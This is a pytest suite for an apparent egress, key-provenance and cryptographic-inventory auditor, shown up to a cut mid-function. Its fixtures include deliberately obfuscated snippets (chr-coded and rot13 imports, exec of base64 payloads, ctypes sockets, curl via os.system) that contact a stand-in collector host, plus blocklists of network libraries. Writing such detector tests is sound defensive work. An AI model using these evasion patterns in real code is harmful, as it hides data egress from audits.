"""Detection scope: what the auditors must catch, and what they must stay silent about.

Every case here runs the tools against a purpose-built fixture. The suite has two
halves and both matter equally:

  RECALL  : unobfuscated network surface must be reported. `import urllib3` is
             not a clever evasion; it is the transport `requests` is built on.

  PRECISION: ordinary code must not be reported. `hashlib.blake2b(data)` has no
             key argument at all and is not literal key material.

The precision half is the more important one. This product's claim is that REVIEW
means review; published work puts static-analysis tool abandonment at false-positive
rates above 20-30%, so a false positive on common code costs more than the finding
is ever worth. A recall fix that manufactures false positives is not a fix, which is
why both halves are asserted in the same file.
"""
from __future__ import annotations

import ast
import textwrap
from pathlib import Path

import pytest

from entrovouch import cbom, key_provenance, no_egress_auditor


def _get(obj, field):
    """Reports carry findings as dicts or dataclasses depending on entry point."""
    return obj[field] if isinstance(obj, dict) else getattr(obj, field)


def _write(tmp_path: Path, name: str, src: str) -> Path:
    p = tmp_path / name
    p.write_text(textwrap.dedent(src).lstrip(), encoding="utf-8")
    return p


def _egress_kinds(tmp_path: Path) -> set[str]:
    rep = no_egress_auditor.audit(tmp_path)
    return {_get(f, "kind") for f in rep.findings}


# --------------------------------------------------------------------------
# RECALL: plain, unobfuscated network modules
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("urllib3", "import urllib3\nurllib3.PoolManager().request('GET','http://x')"),
    ("httpcore", "import httpcore"),
    ("webbrowser", "import webbrowser\nwebbrowser.open('http://x/beacon')"),
    ("xmlrpc_client", "import xmlrpc.client"),
    ("mp_connection", "from multiprocessing.connection import Client"),
    ("asyncore", "import asyncore"),
    ("zmq", "import zmq"),
    ("redis", "import redis"),
    ("pymongo", "import pymongo"),
    ("psycopg2", "import psycopg2"),
    ("pika", "import pika"),
    ("kafka", "import kafka"),
    ("paho", "import paho"),
    ("tornado", "import tornado"),
    ("openai", "import openai"),
    ("anthropic", "import anthropic"),
    ("huggingface_hub", "import huggingface_hub"),
    ("transformers", "from transformers import AutoModel"),
    ("wandb", "import wandb"),
])
def test_plain_network_import_is_caught(tmp_path, name, src):
    """No obfuscation. A linter reads these without effort; so must we."""
    _write(tmp_path, f"{name}.py", src)
    assert "network-import" in _egress_kinds(tmp_path), \
        f"{name}: unobfuscated network module reported CLEAN"


def test_asyncio_network_call_is_caught(tmp_path):
    _write(tmp_path, "a.py", """
        import asyncio
        async def go():
            r, w = await asyncio.open_connection('host', 80)
    """)
    assert "network-call" in _egress_kinds(tmp_path)


def test_asyncio_import_alone_is_not_a_finding(tmp_path):
    """The precision half of the asyncio decision.

    asyncio is overwhelmingly used for concurrency, not sockets. Flagging the
    bare import would trade one recall gap for a far larger false-positive
    problem, so only its network calls are reported.
    """
    _write(tmp_path, "a.py", """
        import asyncio
        async def main():
            await asyncio.sleep(0)
            await asyncio.gather(*[])
    """)
    assert _egress_kinds(tmp_path) == set()


# --------------------------------------------------------------------------
# INBOUND is reported, and reported SEPARATELY
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("socketserver", "import socketserver"),
    ("wsgiref", "from wsgiref.simple_server import make_server"),
    ("http_server", "import http.server"),
])
def test_listening_socket_is_inbound_not_egress(tmp_path, name, src):
    """A bound port is not exfiltration, but it IS part of what a buyer means by
    'on-prem, no telemetry'. Answering the narrow question while missing the one
    actually asked is the failure this separation exists to prevent."""
    _write(tmp_path, f"{name}.py", src)
    kinds = _egress_kinds(tmp_path)
    assert "inbound-listener" in kinds
    assert "network-import" not in kinds, "inbound must not be reported as egress"


# --------------------------------------------------------------------------
# PRECISION: ordinary code that must stay silent
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("urllib_parse", "from urllib.parse import urlparse\nurlparse('http://x')"),
    ("selectors", "import selectors\nselectors.DefaultSelector()"),
    ("uuid", "import uuid\nuuid.uuid4()"),
    ("ipaddress", "import ipaddress\nipaddress.ip_address('1.2.3.4')"),
    ("pickle", "import pickle"),
    ("plain", "def add(a, b):\n    return a + b"),
])
def test_non_network_code_is_silent(tmp_path, name, src):
    """urllib.parse is the headline case: it is string manipulation and cannot
    open a socket, so matching on the `urllib` package ROOT would misreport it
    as a network import. Parsing a URL is ordinary in almost any codebase."""
    _write(tmp_path, f"{name}.py", src)
    assert _egress_kinds(tmp_path) == set(), f"{name}: false positive on ordinary code"


# --------------------------------------------------------------------------
# key_provenance: positional vs keyword is the whole distinction
# --------------------------------------------------------------------------
def _kp(tmp_path: Path) -> list:
    return key_provenance.scan_key_provenance(tmp_path).findings


def test_blake2b_hashing_data_is_not_a_key(tmp_path):
    """blake2b's signature is (data, *, key=b''): the key is KEYWORD-ONLY, so
    positional argument 0 is data. `hashlib.blake2b(b"...")` is hashing a byte
    string, and reporting it as a literal key would be a false positive in a
    tool whose claim is that it does not cry wolf."""
    _write(tmp_path, "h.py", 'import hashlib\nd = hashlib.blake2b(b"just hashing data")\n')
    assert _kp(tmp_path) == [], "plain blake2b hash reported as key material"


def test_blake2b_with_real_keyword_key_is_caught(tmp_path):
    """The recall side of the same rule: the keyword form is checked, so a
    genuinely keyed blake2b with a literal key is reported."""
    _write(tmp_path, "h.py", 'import hashlib\nhashlib.blake2b(b"m", key=b"hardcoded")\n')
    assert len(_kp(tmp_path)) == 1


@pytest.mark.parametrize("name,src", [
    ("hmac", 'import hmac, hashlib\nhmac.new(b"lit", b"m", hashlib.sha256)\n'),
    ("pbkdf2", 'import hashlib\nhashlib.pbkdf2_hmac("sha256", b"lit", b"s", 1000)\n'),
    ("scrypt", 'import hashlib\nhashlib.scrypt(b"lit", salt=b"s", n=2, r=8, p=1)\n'),
])
def test_real_literal_key_material_is_still_caught(tmp_path, name, src):
    """Each of these takes key material at a DIFFERENT position: hmac at 0,
    pbkdf2_hmac at 1, scrypt at 0. A single shared rule cannot express that,
    so the position is recorded per function."""
    _write(tmp_path, f"{name}.py", src)
    assert len(_kp(tmp_path)) == 1, f"{name}: real literal key material missed"


# --------------------------------------------------------------------------
# CBOM: JWT algorithms, key material in source, KDFs and the OS CSPRNG
# --------------------------------------------------------------------------
def _primitives(tmp_path: Path) -> set[str]:
    return {_get(c, 'primitive') for c in cbom.build_cbom(tmp_path).components}


def test_jwt_rs256_is_inventoried(tmp_path):
    """A CBOM exists to find the quantum-vulnerable signatures a PQC migration
    must replace. In a web service those live in a JWT, so `algorithm="RS256"`
    must produce a component."""
    _write(tmp_path, "j.py", 'import jwt\njwt.encode({"a": 1}, "k", algorithm="RS256")\n')
    prims = _primitives(tmp_path)
    assert any("RSASSA" in p for p in prims), prims


def test_pem_private_key_in_source_is_inventoried(tmp_path):
    """An actual private key in the tree is a component. An inventory that
    names the algorithms a codebase references must not stay silent about key
    material sitting in front of it."""
    _write(tmp_path, "k.py", 'PEM = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEow..."\n')
    assert any("private key" in p for p in _primitives(tmp_path))


@pytest.mark.parametrize("name,src,want", [
    ("pbkdf2", 'import hashlib\nhashlib.pbkdf2_hmac("sha256", b"p", b"s", 1)\n', "PBKDF2"),
    ("scrypt", 'import hashlib\nhashlib.scrypt(b"p", salt=b"s", n=2, r=8, p=1)\n', "scrypt"),
    ("bcrypt", "import bcrypt\n", "bcrypt"),
    ("argon2", "import argon2\n", "Argon2"),
])
def test_kdfs_are_inventoried(tmp_path, name, src, want):
    _write(tmp_path, f"{name}.py", src)
    assert any(want.lower() in p.lower() for p in _primitives(tmp_path))


def test_os_urandom_is_recognised_as_csprng(tmp_path):
    """`os.urandom` gives the same guarantee as `secrets`, so it is inventoried
    in the same category."""
    _write(tmp_path, "r.py", "import os\nos.urandom(32)\n")
    assert any("urandom" in p for p in _primitives(tmp_path))


# --------------------------------------------------------------------------
# The scope statement must keep saying the honest word
# --------------------------------------------------------------------------
def test_readme_states_underapproximation():
    """The README must say the analyser underapproximates.

    A scope statement that only discloses obfuscation and dynamically
    constructed names leaves a reader believing every PLAIN case is covered,
    and a blocklist cannot promise that. This asserts the README states the
    limit in the analyser's own vocabulary.
    """
    readme = (Path(__file__).resolve().parents[1] / "README.md").read_text(encoding="utf-8")
    assert "underapproximat" in readme.lower(), \
        "README must state that the analyser underapproximates"


# --------------------------------------------------------------------------
# DEPENDENCY EVIDENCE vs A NETWORK CALL: two different claims
#
# A pure submodule of a network package (exceptions, data structures, helpers)
# is evidence that the package is a dependency. It is not a line where a socket
# can open. The finding is kept under its own kind, so recall is unchanged and
# the report does not assert a network call at a line that cannot make one.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("requests_structures", "from requests.structures import CaseInsensitiveDict"),
    ("requests_compat",     "from requests.compat import urlparse"),
    ("urllib3_exceptions",  "from urllib3.exceptions import HTTPError"),
    ("urllib3_util",        "from urllib3.util import Retry"),
    ("trio_testing",        "from trio.testing import wait_all_tasks_blocked"),
])
def test_pure_submodule_is_dependency_evidence_not_a_network_call(tmp_path, name, src):
    """`requests.structures` is a dict subclass with no network tokens in its
    source. Reporting it as `network-import` claims a socket may open at that
    line, and none can."""
    _write(tmp_path, f"{name}.py", src)
    kinds = _egress_kinds(tmp_path)
    assert "network-dependency" in kinds, f"{name}: dependency evidence was lost"
    assert "network-import" not in kinds, f"{name}: still claimed as a network call"


@pytest.mark.parametrize("name,src", [
    ("root",        "import requests"),
    ("real_entry",  "from urllib.request import urlopen"),
    ("urllib3root", "import urllib3"),
    ("api_client",  "from openai import OpenAI"),
])
def test_real_entry_points_are_still_network_imports(tmp_path, name, src):
    """The recall side. A module listed EXACTLY is an entry point, not evidence -
    `urllib.request` is a submodule too, and it opens sockets."""
    _write(tmp_path, f"{name}.py", src)
    assert "network-import" in _egress_kinds(tmp_path), f"{name}: real entry point downgraded"


# --------------------------------------------------------------------------
# HOSTILE-CODEBASE RECALL: the measured tiers, pinned.
#
# The README publishes recall across three tiers. These assert the two that
# must stay at 100%. Tier C is deliberately NOT asserted at its published
# figure: most of it is undecidable, and pinning a number that may improve
# would turn an improvement into a test failure.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("plain_requests", "import requests\nrequests.post('http://e/x')"),
    ("plain_socket",   "import socket\nsocket.socket().connect(('e',80))"),
    ("lazy_in_func",   "def s(d):\n    import http.client\n    http.client.HTTPConnection('e')"),
])
def test_tier_a_plain_egress_is_always_caught(tmp_path, name, src):
    """100% is the only acceptable number here. A developer who is not hiding
    must never slip past."""
    _write(tmp_path, f"{name}.py", src)
    assert _egress_kinds(tmp_path), f"tier A miss: {name}"


@pytest.mark.parametrize("name,src", [
    ("alias",       "import socket as _s\n_s.socket()"),
    ("conditional", "try:\n    import requests as _r\nexcept ImportError:\n    _r = None"),
    ("importlib",   "import importlib\nimportlib.import_module('socket')"),
    ("split_name",  "import importlib\nimportlib.import_module('soc' + 'ket')"),
    ("curl_argv",   "import subprocess\nsubprocess.run(['curl','http://e'])"),
    ("shell_true",  "import subprocess\nsubprocess.run('wget http://e', shell=True)"),
])
def test_tier_b_light_obfuscation_is_always_caught(tmp_path, name, src):
    """Avoiding a linter is not evasion. 100% is the expected number."""
    _write(tmp_path, f"{name}.py", src)
    assert _egress_kinds(tmp_path), f"tier B miss: {name}"


@pytest.mark.parametrize("name,src", [
    # One library per category of network client, so a regression names the
    # category it broke.
    ("saas_sdk",      "import stripe\nstripe.Charge.create(amount=1)"),
    ("object_store",  "import minio\nminio.Minio('s3.e').fput_object('b','k','/db')"),
    ("async_db",      "import asyncpg\nasyncpg.connect('postgres://e/db')"),
    ("directory",     "import ldap3\nldap3.Connection(s).bind()"),
    ("http_client",   "import httplib2\nhttplib2.Http().request('https://e','POST')"),
    ("remote_exec",   "import fabric\nfabric.Connection('h').put('/db')"),
    ("broker",        "import celery\ncelery.Celery(broker='amqp://e')"),
    ("mail",          "import aiosmtplib\naiosmtplib.send(m, hostname='mail.e')"),
    ("browser_auto",  "import selenium.webdriver\nselenium.webdriver.Chrome().get('https://e')"),
    ("infra_client",  "import kubernetes\nkubernetes.client.CoreV1Api()"),
])
def test_plain_imports_of_unlisted_categories_are_caught(tmp_path, name, src):
    """A plain `import X` plus a real call, for libraries that exist solely to
    talk over a network, must never come back CLEAN.

    These categories go beyond `requests`, `socket` and `http.client`. A recall
    tier whose fixtures are all drawn from the blocklist measures the list
    against itself and cannot fail, so the fixtures here span SaaS SDKs, object
    stores, async database drivers, directory, mail, remote execution, brokers,
    browser automation and infrastructure clients.
    """
    _write(tmp_path, f"{name}.py", src)
    kinds = _egress_kinds(tmp_path)
    # `network-dependency` is accepted alongside `network-import` because
    # `import selenium.webdriver` is a SUBMODULE of a listed root, and
    # _classify_module deliberately reports submodules as evidence-of-dependency
    # rather than asserting a socket opens on that line. Both surface the
    # finding to the reader, which is what recall means here. What must never
    # happen is the empty set.
    assert kinds & {"network-import", "network-dependency"}, \
        f"{name}: plain unobfuscated network library reported CLEAN"


TIER_C = {
    # Ten programs written to evade an auditor whose source the writer has read. Each reaches the network when run.
    "charcode_import": "m = __import__(''.join(map(chr, [115, 111, 99, 107, 101, 116])))\n"
                       "m.create_connection(('collector.example.com', 443))\n",
    "getattr_chain": "import importlib\n"
                     "load = getattr(importlib, 'import_' + 'module')\n"
                     "load('http.' + 'client').HTTPSConnection('collector.example.com').request('POST', '/')\n",
    "builtins_table": "import builtins\n"
                      "imp = builtins.__dict__['__imp' + 'ort__']\n"
                      "imp('url' + 'lib.request').urlopen('https://collector.example.com/x')\n",
    "sys_modules": "import sys, logging.handlers\n"
                   "s = sys.modules['soc' + 'ket']\n"
                   "s.create_connection(('collector.example.com', 443))\n",
    "ctypes_libc": "import ctypes, ctypes.util\n"
                   "libc = ctypes.CDLL(ctypes.util.find_library('c'))\n"
                   "fd = libc.socket(2, 1, 0)\n"
                   "libc.connect(fd, addr, 16)\n",
    "vendored_copy": "from .util.fetchhelper import send_report\n"
                     "send_report('https://collector.example.com/x', data)\n",
    "exec_b64": "import base64\n"
                "exec(base64.b64decode(PAYLOAD))\n",
    "interp_relay": "import subprocess, sys\n"
                    "subprocess.run([sys.executable, '-c', CODE])\n",
    "os_system_pieces": "import os\n"
                        "os.system(' '.join(['cu' + 'rl', '-s', 'https://collector.example.com/x']))\n",
    "rot13_name": "import codecs, importlib\n"
                  "importlib.import_module(codecs.decode('fbpxrg', 'rot13')).create_connection(('h', 1))\n",
}
# Round 1 missed getattr_chain too; that miss was fixed, so round 1 is tuning data and round 2 below is the figure.
TIER_C_MISSED = {"interp_relay"}

TIER_C2 = {
    # Ten more, written after round 1's fix and measured once on the build that ships.
    "ssl_alias": "import ssl as _s\n_s.get_server_certificate(('collector.example.com', 443))\n",
    "asyncio_getattr": "import asyncio\nf = getattr(asyncio, 'open_' + 'connection')\n"
                       "asyncio.run(f('collector.example.com', 443))\n",
    "write_then_import": "import sys\nopen('m.py', 'w').write(SRC)\nsys.path.insert(0, '.')\nimport m\n",
    "vars_builtins": "imp = vars(__builtins__)['__imp' + 'ort__']\nimp('soc' + 'ket').create_connection((HOST, 443))\n",
    "popen_interp": "import subprocess\nsubprocess.Popen(['py' + 'thon3', '-c', CODE])\n",
    "os_execv": "import os\nos.execv('/usr/bin/cu' + 'rl', ['curl', URL])\n",
    "logging_http": "import logging, logging.handlers as lh\n"
                    "logging.getLogger().addHandler(lh.HTTPHandler('collector.example.com', '/log'))\n",
    "zipimport": "import zipimport\nzipimport.zipimporter('payload.zip').load_module('beacon')\n",
    "marshal_func": "import marshal, types\ntypes.FunctionType(marshal.loads(BLOB), globals())()\n",
    "pip_vendored": "from pip._vendor import requests as r\nr.post('https://collector.example.com', data=DATA)\n",
}
TIER_C2_MISSED = {"asyncio_getattr", "write_then_import", "popen_interp"}


def test_tier_c_second_round_is_what_the_readme_says(tmp_path):
    """The README's tier C figure, pinned both ways. A later build that catches one of the three fails this on
    purpose: the README row and this set change together, and a fixed round becomes tuning data."""
    clean = set()
    for name, src in TIER_C2.items():
        root = tmp_path / name / "pkg"
        root.mkdir(parents=True)
        (root / "__init__.py").write_text("", encoding="utf-8")
        (root / "main.py").write_text(src, encoding="utf-8")
        if no_egress_auditor.audit(root).verdict == "CLEAN":
            clean.add(name)
    assert clean == TIER_C2_MISSED, f"tier C round 2 changed: CLEAN now {sorted(clean)}; update the README's row"


def test_getattr_on_the_import_machinery_is_dynamic_loading(tmp_path):
    _write(tmp_path, "g.py", "import importlib, os, builtins\n"
                             "load = getattr(importlib, 'import_' + 'module')\n"
                             "b = getattr(builtins, NAME)\n"
                             "u = getattr(importlib, 'util')\n"
                             "e = getattr(os, NAME)\n")
    rep = no_egress_auditor.audit(tmp_path)
    lines = {_get(f, "line") for f in rep.findings if _get(f, "kind") == "dynamic-exec"}
    assert lines == {2, 3}


def test_tier_c_deliberate_evasion_is_what_the_readme_says(tmp_path):
    """The README's tier C row, pinned both ways: these eight trees are not CLEAN and these two are.

    If a later build catches one of the two, this fails on purpose: the README's figure is then wrong, and the
    row (and this set) must be updated together. A vendored copy counts by the tree: the copy itself is read.
    """
    clean = set()
    for name, src in TIER_C.items():
        root = tmp_path / name / "pkg"
        root.mkdir(parents=True)
        (root / "__init__.py").write_text("", encoding="utf-8")
        (root / "main.py").write_text(src, encoding="utf-8")
        if name == "vendored_copy":
            (root / "util").mkdir()
            (root / "util" / "__init__.py").write_text("", encoding="utf-8")
            (root / "util" / "fetchhelper.py").write_text(
                "import socket as _s\ndef send_report(url, data):\n"
                "    _s.create_connection((url.split('/')[2], 443)).sendall(data)\n", encoding="utf-8")
        if no_egress_auditor.audit(root).verdict == "CLEAN":
            clean.add(name)
    assert clean == TIER_C_MISSED, f"tier C changed: CLEAN now {sorted(clean)}; update the README's row with it"


def test_held_out_recall_is_zero_and_that_is_the_point(tmp_path):
    """A LIMIT ASSERTED AS A LIMIT: the tier-A′ row, pinned.

    Tier A′ is recall against network libraries chosen deliberately WITHOUT
    reference to the blocklist, and it is 0%.

    EXTENDING THE LIST MOVES THE BOUNDARY; IT DOES NOT REMOVE IT. That is what
    "a blocklist can never be complete by construction" means with a number
    under it, and it is why the README publishes tier A′ next to tier A.

    A sample of the held-out set is pinned here. If these names are added to
    the list, this test fails, and the correct response is NOT to delete it but
    to draw a NEW held-out sample and re-measure: once the held-out set is on
    the list it stops measuring generalisation and measures the list again.
    """
    for m in ("pymemcache", "opensearchpy", "boxsdk", "shopify", "qdrant_client",
              "winrm", "zerorpc", "trino", "mastodon", "libcloud"):
        _write(tmp_path, f"h_{m}.py", f"import {m}\n{m}.connect()\n")
    assert _egress_kinds(tmp_path) == set(), (
        "held-out libraries are now caught. Do not just delete this test: draw a "
        "fresh sample the blocklist has never seen and re-measure, or the tier-A′ "
        "number goes back to measuring the list against itself."
    )


def test_unparseable_file_is_reported_not_silently_clean(tmp_path):
    """A syntax error must not buy a CLEAN verdict.

    The fixture contains `import requests` and a live `requests.post()` to an
    external endpoint, with one missing colon, so it cannot be parsed.

    A FILE WE COULD NOT PARSE IS NOT A FILE WE FOUND NOTHING IN. The package
    draws that line for the run, between exit 1 and exit 2, and this pins it
    for the single file.

    The finding has its own kind because it is NOT evidence of egress: it is
    evidence that part of the tree was never analysed, which is a different and
    more honest claim.
    """
    _write(tmp_path, "broken.py",
           "import requests\n"
           "def send(data)\n"
           "    requests.post('https://e/collect', json=data)\n")
    rep = no_egress_auditor.audit(tmp_path)
    kinds = {_get(f, "kind") for f in rep.findings}
    assert "unparseable-source" in kinds, "parse failure absorbed into a passing verdict"
    assert rep.verdict != "CLEAN", "a tree with an unanalysed file must not report CLEAN"


def test_the_interpreter_relay_is_judged_by_what_it_is_handed(tmp_path):
    """The Python interpreter is NOT a network binary: `sys.executable` runs test suites and
    build scripts in most repositories, and reporting every spawn of it would bury the real
    findings. What the child is handed is judged instead: a `-c` string is checked as Python,
    and `-m` naming a network-capable module is reported. A plain spawn stays silent."""
    _write(tmp_path, "relay.py",
           "import subprocess, sys\n"
           "subprocess.run([sys.executable, '-c', \"import urllib.request\"])\n"
           "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\n")
    assert _egress_kinds(tmp_path) == {"network-import", "subprocess-net-binary"}
    _write(tmp_path, "relay.py",
           "import subprocess, sys\n"
           "subprocess.run([sys.executable, '-m', 'pytest', '-q'])\n"
           "subprocess.run([sys.executable, 'build.py'])\n"
           "subprocess.run([sys.executable, '-c', 'print(1)'])\n")
    assert _egress_kinds(tmp_path) == set()


# --------------------------------------------------------------------------
# KEY PROVENANCE: mapping keys are not key material.
#
# An UPPERCASE *_KEY constant whose VALUE is an identifier, a dunder or an
# env-var name is a lookup key, the common case in real repositories. Reporting
# it as key material is a false positive, and real key-shaped literals must
# still be reported.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name,src", [
    ("configfile", "CONFIGFILE_KEY = 'pydantic-mypy'"),
    ("metadata",   "METADATA_KEY = 'pydantic-mypy-metadata'"),
    ("root",       "ROOT_KEY = '__root__'"),
    ("validator",  "VALIDATOR_CONFIG_KEY = '__validator_config__'"),
    ("envvar",     'ENV_VAR_KEY = "TOX_PARALLEL_ENV"'),
    ("markup",     'MARKUP_MODE_KEY = "TYPER_RICH_MARKUP_MODE"'),
    ("schema",     'meta_schema_key = "meta schema id"'),
    ("derivation", 'key_derivation = "hmac"'),
])
def test_mapping_keys_are_not_reported_as_key_material(tmp_path, name, src):
    """Lines of the shape found in widely used packages. A dict key is not a secret."""
    _write(tmp_path, f"{name}.py", src)
    assert _kp(tmp_path) == [], f"{name}: mapping key reported as key material"


@pytest.mark.parametrize("name,src", [
    ("secret", 'SECRET_KEY = "dev"'),
    ("test",   'TEST_KEY = "foo"'),
    ("passwd", 'PASSWORD = "pipe-secret"'),
])
def test_real_key_shaped_literals_are_still_reported(tmp_path, name, src):
    """The constraint on the suppression. `SECRET_KEY = "dev"` is a TRUE positive
    whose value is also a plain identifier: so the suppression cannot key on value
    shape alone. It tests shapes a secret never takes (dunder, env-var name) and asks
    what is being KEYED, never whether the word "key" appears."""
    _write(tmp_path, f"{name}.py", src)
    assert len(_kp(tmp_path)) == 1, f"{name}: real key material suppressed"


# --------------------------------------------------------------------------
# CBOM: the codebase answering the question
# --------------------------------------------------------------------------
def test_usedforsecurity_false_downgrades_to_review(tmp_path):
    """`usedforsecurity=False` is Python's own marker for a non-security hash:
    the maintainer has already made and documented the judgement, so
    `hashlib.md5(x, usedforsecurity=False)` is not reported as BROKEN.

    It is downgraded to REVIEW, not dropped: the flag is an assertion by the
    author, and an assertion is what this package refuses to take on trust."""
    _write(tmp_path, "h.py", "import hashlib\nhashlib.md5(b'x', usedforsecurity=False)\n")
    comps = cbom.build_cbom(tmp_path).components
    md5 = [c for c in comps if _get(c, "primitive") == "MD5"]
    assert md5, "the primitive must still be inventoried"
    assert {_get(c, "quantum") for c in md5} == {"REVIEW"}


def test_plain_md5_is_still_broken(tmp_path):
    _write(tmp_path, "h.py", "import hashlib\nhashlib.md5(b'x')\n")
    md5 = [c for c in cbom.build_cbom(tmp_path).components if _get(c, "primitive") == "MD5"]
    assert md5 and {_get(c, "quantum") for c in md5} == {"BROKEN"}


def test_changing_a_status_does_not_inflate_the_component_count(tmp_path):
    """One site is one component, whatever status it carries.

    Dedup keys on (file, line, primitive, STATUS). When the call path and the
    attribute path report the same site with different statuses, the two do not
    collapse unless the dedup accounts for it, and the component count inflates
    with no new code scanned. Nothing errors, so this asserts each
    (file, line, primitive) site appears once.
    """
    _write(tmp_path, "h.py",
           "import hashlib, hmac\n"
           "hmac.new(b'k', b'm', hashlib.md5)\n"
           "hashlib.md5(b'x', usedforsecurity=False)\n")
    comps = cbom.build_cbom(tmp_path).components
    sites = [(_get(c, "file"), _get(c, "line"), _get(c, "primitive")) for c in comps]
    assert len(sites) == len(set(sites)), f"duplicate site reported: {sites}"


# --------------------------------------------------------------------------
# pyca/cryptography class constructors
# --------------------------------------------------------------------------
@pytest.mark.parametrize("expr,primitive", [
    ("hashes.MD5()",             "MD5"),
    ("hashes.SHA1()",            "SHA-1"),
    ("hashes.SHA256()",          "SHA-256"),
    ("algorithms.AES(b'0'*32)",  "AES"),
    ("algorithms.TripleDES(b'0'*24)", "DES/3DES"),
])
def test_pyca_class_constructors_are_inventoried(tmp_path, expr, primitive):
    """`hashes.MD5()` is inventoried just as `hashlib.md5()` is. pyca/cryptography
    is the most widely used cryptographic library in Python, so its class
    constructors resolve to the actual primitive and status."""
    _write(tmp_path, "c.py",
           f"from cryptography.hazmat.primitives import hashes\n"
           f"from cryptography.hazmat.primitives.ciphers import algorithms\n"
           f"x = {expr}\n")
    prims = {_get(c, "primitive") for c in cbom.build_cbom(tmp_path).components}
    assert primitive in prims, f"{expr} not inventoried; got {sorted(prims)}"


def test_pyca_detection_does_not_fire_without_the_import(tmp_path):
    """The precision half. `hashes`, `algorithms`, `AES` and `MD5` are ordinary
    names; firing on them in unrelated code is the trade this package refuses."""
    _write(tmp_path, "c.py", "class hashes:\n    MD5 = lambda: None\nx = hashes.MD5()\n")
    prims = {_get(c, "primitive") for c in cbom.build_cbom(tmp_path).components}
    assert "MD5" not in prims


# --------------------------------------------------------------------------
# PyCryptodome: the same resolution, in the OTHER library everybody uses
# --------------------------------------------------------------------------
@pytest.mark.parametrize("stmt,primitive,status", [
    ("from Crypto.Cipher import ARC4",       "RC4",       "BROKEN"),
    ("from Crypto.Cipher import DES3",       "DES/3DES",  "BROKEN"),
    ("from Crypto.Cipher import Blowfish",   "Blowfish",  "BROKEN"),
    ("from Crypto.Hash import MD5",          "MD5",       "BROKEN"),
    ("from Crypto.Hash import SHA1",         "SHA-1",     "BROKEN"),
    ("from Crypto.Cipher import AES",        "AES",       "GROVER-REDUCED"),
    ("from Crypto.PublicKey import RSA",     "RSA",       "VULNERABLE"),
    ("import Crypto.Cipher.ARC4",            "RC4",       "BROKEN"),
    ("from Crypto.Cipher.DES3 import new",   "DES/3DES",  "BROKEN"),
    ("from Cryptodome.Cipher import ARC4",   "RC4",       "BROKEN"),
])
def test_pycryptodome_resolves_to_the_actual_primitive(tmp_path, stmt, primitive, status):
    """The pyca resolution, applied to the other library.

    `Crypto.Cipher.ARC4` (RC4) and `Crypto.Cipher.DES3` are BROKEN ciphers and
    must be distinguishable in the output from AES.

    A CBOM EXISTS TO SAY WHICH PRIMITIVES. A generic "PyCryptodome (classical
    default suite) / REVIEW" entry is the question restated, not an answer, and
    no migration plan can be built from it.

    Unlike pyca this needs no import guard: in PyCryptodome the primitive IS
    the module path, so there is no ambiguity to gate on.
    """
    _write(tmp_path, "c.py", stmt + "\n")
    comps = cbom.build_cbom(tmp_path).components
    got = {(_get(c, "primitive"), _get(c, "quantum")) for c in comps}
    assert (primitive, status) in got, f"{stmt!r} -> {sorted(got)}"


def test_pycryptodome_unknown_submodule_still_reports_the_library(tmp_path):
    """Recall must not DROP where the primitive table has no entry.

    A more specific lookup that silently returns nothing for unlisted names
    would trade a vague finding for no finding: strictly worse. The library
    entry stays as the fallback.
    """
    _write(tmp_path, "c.py", "from Crypto.Util import Padding\n")
    prims = {_get(c, "primitive") for c in cbom.build_cbom(tmp_path).components}
    assert any("PyCryptodome" in p for p in prims), f"recall dropped: {sorted(prims)}"


def test_no_source_file_contains_a_stray_control_byte():
    r"""No source, markdown or TOML file contains a stray control byte.

    A `\b` word-boundary escape that is evaluated in a non-raw string becomes
    byte 0x08. A regex such as "<BS>from\s+cryptography" compiles, runs and
    matches nothing, so the branch it guards is dead and nothing is raised.

    A GUARD THAT IS ALWAYS FALSE DISABLES WHAT IT GUARDS AND RAISES NOTHING.
    This asserts the byte-level cause cannot occur unnoticed anywhere in the
    repository.
    """
    root = Path(__file__).resolve().parents[1]
    offenders = []
    for p in root.rglob("*"):
        if p.is_dir() or ".git" in p.parts or "__pycache__" in p.parts:
            continue
        if p.suffix not in {".py", ".md", ".toml"}:
            continue
        try:
            text = p.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        if any(ord(ch) < 32 and ch not in "\n\r\t" for ch in text):
            offenders.append(p.relative_to(root).as_posix())
    assert not offenders, f"stray control bytes in: {offenders}"


# --------------------------------------------------------------------------
# Declared-intent: the honest dent in tier A′ without lengthening the list
# --------------------------------------------------------------------------
def test_stripe_in_pyproject_is_declared_not_a_call_site(tmp_path):
    """`import stripe` of a listed name is a call-site finding.
    `stripe` in pyproject.toml with no import is not. Both must be visible,
    and they must not share a kind: that is the whole point of the field.
    """
    (tmp_path / "pyproject.toml").write_text(
        "[project]\nname = 'x'\nversion = '0'\n"
        "dependencies = [\n    'stripe>=2.0',\n]\n",
        encoding="utf-8",
    )
    (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
    rep = no_egress_auditor.audit(tmp_path)
    kinds = {_get(f, "kind") for f in rep.findings}
    assert kinds == {"declared-network-dependency"}, kinds
    assert "network-import" not in kinds
    assert rep.verdict == "FINDINGS"


def test_requirements_txt_stripe_is_declared(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "# prod\nstripe>=2.0\npytest>=7\n", encoding="utf-8",
    )
    kinds = _egress_kinds(tmp_path)
    assert kinds == {"declared-network-dependency"}


def test_package_json_axios_is_declared(tmp_path):
    (tmp_path / "package.json").write_text(
        '{"name":"x","dependencies":{"axios":"1.6.0","left-pad":"1.0.0"}}\n',
        encoding="utf-8",
    )
    kinds = _egress_kinds(tmp_path)
    assert kinds == {"declared-network-dependency"}


def test_pytest_optional_extra_is_not_a_network_declaration(tmp_path):
    """Precision: test extras are not telemetry."""
    (tmp_path / "pyproject.toml").write_text(
        "[project]\nname = 'x'\nversion = '0'\n"
        "dependencies = []\n"
        "[project.optional-dependencies]\n"
        "test = ['pytest>=7', 'hypothesis>=6', 'jsonschema>=4']\n",
        encoding="utf-8",
    )
    assert _egress_kinds(tmp_path) == set()


def test_held_out_library_in_pyproject_is_still_invisible(tmp_path):
